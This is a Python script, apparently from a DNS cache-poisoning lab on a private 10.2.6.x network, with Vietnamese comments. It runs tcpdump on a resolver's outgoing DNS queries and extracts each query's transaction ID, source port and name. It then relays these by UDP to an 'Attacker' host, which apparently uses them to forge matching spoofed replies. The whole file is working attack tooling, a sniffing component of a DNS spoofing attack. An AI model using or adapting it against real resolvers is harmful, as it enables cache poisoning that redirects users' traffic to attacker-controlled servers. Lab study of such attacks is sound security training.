#!/usr/bin/env python3
"""Bat TXID bang tcpdump, gui hit qua UDP toi Attacker (tranh tre vboxsf)."""
import re
import socket
import subprocess
import sys
import threading

NS_IPS = set()
HIT_LIMIT = 20
hits = 0
lock = threading.Lock()
SENDER_ADDR = ("10.2.6.1", 39099)

# 10.2.6.53.<sport> > <ns_ip>.53: <txid>... A? <qname>.
LINE_RE = re.compile(
    r"IP\s+10\.2\.6\.53\.(\d+)\s+>\s+(\d+\.\d+\.\d+\.\d+)\.53:\s+(\d+)\S*\s+"
    r".*?[A-Z]+\?\s+([0-9A-Za-z._-]+)\."
)


def load_ns_ips(path: str) -> None:
    with open(path, encoding="utf-8") as handle:
        for line in handle:
            ip = line.strip()
            if ip:
                NS_IPS.add(ip)


def publish_hit(txid: int, qname: str, ns_ip: str, sport: int) -> None:
    msg = f"{txid} {qname} {ns_ip} {sport}".encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(msg, SENDER_ADDR)
    finally:
        sock.close()


def handle_line(line: str) -> None:
    global hits
    match = LINE_RE.search(line)
    if not match:
        return
    sport_s, ns_ip, txid_s, qname = match.group(1), match.group(2), match.group(3), match.group(4)
    if ns_ip not in NS_IPS:
        return
    if not re.fullmatch(r"[a-z0-9]{3,}\.example\.com", qname, flags=re.I):
        return
    txid = int(txid_s)
    sport = int(sport_s)
    with lock:
        if hits >= HIT_LIMIT:
            return
        hits += 1
        current = hits
    print(
        f"[sniff] HIT#{current} txid={txid} sport={sport} qname={qname} ns={ns_ip}",
        flush=True,
    )
    publish_hit(txid, qname, ns_ip, sport)


def main() -> int:
    if len(sys.argv) < 2:
        print("Usage: sniff_spoof.py ns_ips.txt [iface] [seconds]", file=sys.stderr)
        return 1
    load_ns_ips(sys.argv[1])
    iface = sys.argv[2] if len(sys.argv) > 2 else "eth0"
    seconds = int(sys.argv[3]) if len(sys.argv) > 3 else 40
    print(f"[sniff] iface={iface} ns={len(NS_IPS)} timeout={seconds}s -> {SENDER_ADDR}", flush=True)

    # Khong khoa src port 44444: neu named chua nap query-source van bat duoc.
    cmd = [
        "tcpdump", "-i", iface, "-n", "-l", "-nn",
        "udp", "and", "src", "host", "10.2.6.53", "and", "dst", "port", "53",
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
    timer = threading.Timer(seconds, proc.kill)
    timer.daemon = True
    timer.start()
    assert proc.stdout is not None
    try:
        for line in proc.stdout:
            line = line.strip()
            if line:
                handle_line(line)
    finally:
        timer.cancel()
        if proc.poll() is None:
            proc.kill()
        proc.wait()
    print(f"[sniff] done hits={hits}", flush=True)
    return 0 if hits > 0 else 2


if __name__ == "__main__":
    raise SystemExit(main())
